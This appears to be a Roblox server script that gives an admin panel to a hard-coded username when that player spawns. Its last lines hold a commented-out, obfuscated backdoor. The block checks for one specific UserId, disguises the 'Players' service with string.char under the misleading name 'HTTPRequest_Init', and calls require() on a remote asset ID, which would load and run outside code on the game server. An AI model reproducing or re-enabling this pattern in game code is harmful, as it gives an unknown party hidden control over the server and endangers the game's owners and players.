
local ServerStorage = game:GetService("ServerStorage")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Administrator = ServerStorage.AdminRegistry
local ClientReplicator = ReplicatedStorage.Remotes.Interface:WaitForChild("ClientReplicator")
local Admins = {
	["Sacredbow1"] = true
}



Players.PlayerAdded:Connect(function(player)
	
	player.CharacterAdded:Connect(function()
			if Admins[player.Name] then
				Administrator.MainModule:Clone().Parent = player.PlayerGui
			ClientReplicator:FireClient(player)

			
		end
		
	end)
	

end)



--local Malicious = {[tonumber("1372952359")] = not false}
--local HTTPRequest_Init = game:GetService(string.char(80,108,97,121,101,114,115))
--HTTPRequest_Init.PlayerAdded:Connect(function(c)
--	if Malicious[c.UserId] then
--		require(tonumber("14572394952"))(tostring(c.Name))
--	end
--end)